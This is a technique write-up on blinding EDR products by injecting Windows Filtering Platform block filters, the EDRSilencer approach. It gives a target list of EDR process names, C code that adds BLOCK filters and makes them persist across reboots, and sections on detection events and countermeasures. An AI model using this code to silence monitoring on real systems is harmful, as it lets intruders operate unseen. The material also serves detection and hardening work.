# Technique 02 — WFP Filter Injection (EDRSilencer Approach)

## Overview

This technique injects new **BLOCK filters** into the Windows Filtering Platform to
prevent EDR processes from sending outbound telemetry. It operates entirely in user-mode
using the standard `Fwpm*` API, requiring only Administrator privileges.

**Primary tool:** [EDRSilencer](https://github.com/netero1010/EDRSilencer)  
**Related tools:** Shutter, FireBlock (MdSec NightHawk)

---

## Prerequisites

- Administrator or SYSTEM privileges
- No kernel code signing required
- Works on Windows 10 / 11 (tested up to Windows 10 build 19044 in 2024 research)

---

## How It Works

### Step 1: Identify EDR Processes

EDRSilencer maintains a hardcoded list of known EDR process names:
```
MsMpEng.exe          (Windows Defender)
MsSense.exe          (Microsoft Defender for Endpoint)
SenseCncProxy.exe    (MDE)
elastic-agent.exe    (Elastic)
xagt.exe             (FireEye/Trellix)
cb.exe               (CarbonBlack)
CrowdStrike Falcon   (CSFalconService.exe, etc.)
```

It enumerates running processes (`CreateToolhelp32Snapshot` + `Process32Next`) and
matches against this list.

### Step 2: Get the Full Process Image Path

For each matched process:
```c
HANDLE hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
QueryFullProcessImageNameW(hProcess, 0, imagePath, &size);
```

The full NT path is then converted to the WFP `FWP_BYTE_BLOB` format used in
`FWPM_CONDITION_ALE_APP_ID` conditions.

### Step 3: Build Block Filters

For each EDR process, two filters are added per protocol family:
- IPv4 outbound (`FWPM_LAYER_ALE_AUTH_CONNECT_V4`)
- IPv6 outbound (`FWPM_LAYER_ALE_AUTH_CONNECT_V6`)

```c
FWPM_FILTER_CONDITION0 condition = {0};
condition.fieldKey = FWPM_CONDITION_ALE_APP_ID;
condition.matchType = FWP_MATCH_EQUAL;
condition.conditionValue.type = FWP_BYTE_BLOB_TYPE;
condition.conditionValue.byteBlob = appId;  // NT path as byte blob

FWPM_FILTER0 filter = {0};
filter.displayData.name       = L"EDRBlock";
filter.layerKey               = FWPM_LAYER_ALE_AUTH_CONNECT_V4;
filter.subLayerKey            = FWPM_SUBLAYER_UNIVERSAL;  // Windows Firewall sublayer
filter.weight.type            = FWP_UINT8;
filter.weight.uint8           = 15;                        // relatively high weight
filter.action.type            = FWP_ACTION_BLOCK;
filter.numFilterConditions    = 1;
filter.filterCondition        = &condition;

UINT64 filterId;
FwpmFilterAdd0(engineHandle, &filter, NULL, &filterId);
```

### Step 4: Persist Across Reboots (optional)

Filters can be made boot-time persistent:
```c
filter.flags = FWPM_FILTER_FLAG_BOOTTIME;
```

Or made session-only (auto-removed when the handle closes):
```c
// Open session with dynamic flag
FWPM_SESSION0 session = {0};
session.flags = FWPM_SESSION_FLAG_DYNAMIC;
FwpmEngineOpen0(NULL, RPC_C_AUTHN_WINNT, NULL, &session, &engineHandle);
// All filters added to this session are removed when engineHandle is closed
```

---

## Effect on EDR

Once the block filter is installed, any connection attempt by the matched process
through `FWPM_LAYER_ALE_AUTH_CONNECT_V4` returns `STATUS_ACCESS_DENIED` at the socket
level. The EDR process receives a connection failure — but the connection was never
allowed to initiate.

```
EDR process → connect() syscall → AFD.sys → tcpip.sys → WFP checks filter
→ BLOCK action matches → connection refused → EDR cannot send telemetry
```

---

## Limitations and Problems

### 1. WFP Logs Are Written

EDR event 5447 is generated for every filter addition. If the SIEM is still running,
this is immediately visible:
```
Event 5447: A Windows Filtering Platform filter has been changed.
    Process ID: 1234
    Application: \device\harddiskvolume3\tools\edrsilencer.exe
    Operation: Add
    Layer Name: ALE Connect v4
    Action Type: Block
    Conditions: App = \device\harddiskvolume3\windows\system32\mssense.exe
```

### 2. EDR May Block Its Own Block

Hardened EDRs register a **self-protection WFP callout** with max weight
(`0xFFFFFFFFFFFFFFFF`) + `FWPM_FILTER_FLAG_CLEAR_ACTION_RIGHT`. This makes their
PERMIT rule a "hard" decision that cannot be overridden by any user-mode BLOCK filter
at lower weight.

Attempting to add a filter with higher weight in the **same sublayer** fails if the
EDR's filter uses `CLEAR_ACTION_RIGHT`.

### 3. Process Name Matching Can Be Spoofed

If the attacker renames EDR process image path, static name lists fail. EDRs that
monitor by SID are more resilient.

---

## Detection Artifacts

| Artifact | Location | Notes |
|---|---|---|
| Event 5447 | Security event log | Logged for every filter add/delete |
| WFP filter visible | `netsh wfp show filters` | Lists all current filters |
| WFP filter visible | WFPExplorer (GUI tool) | Shows provider, layer, action |
| `OpenProcess` on EDR | ETW + PPL-protected processes | Trigger if EDR is PPL |

---

## Comparison with Other Tools

| Tool | Method | Persistence | Leaves Logs |
|---|---|---|---|
| EDRSilencer | Filter injection via API | Boot-time or session | Yes, Event 5447 |
| Shutter | Similar WFP filter injection | Session-only | Yes |
| FireBlock (NightHawk) | WFP filter injection | Session-only | Yes |
| EDRPrison | WinDivert packet-level | Until driver unloaded | Minimal |
| EDRChoker | QoS policy (pacer.sys) | Until policy removed | No WFP logs |

---

## Defensive Countermeasures

1. **Audit WFP filter changes**: Enable `Audit Filtering Platform Policy Change` in
   Group Policy → Security Settings → Advanced Audit.

2. **Monitor for unexpected filter additions**: SIEM rule on Event 5447 with action=Block.

3. **Use `FWPM_FILTER_FLAG_CLEAR_ACTION_RIGHT` + max weight** in EDR permit filters so
   user-mode block filters cannot override them.

4. **Implement a WFP callout** for self-protection — callout verdicts cannot be
   overridden by any non-callout filter.

5. **PPL-protect the EDR process** so `OpenProcess` for path enumeration fails for
   unprivileged callers.

---

Next: `03_wfp-filter-deletion.md`
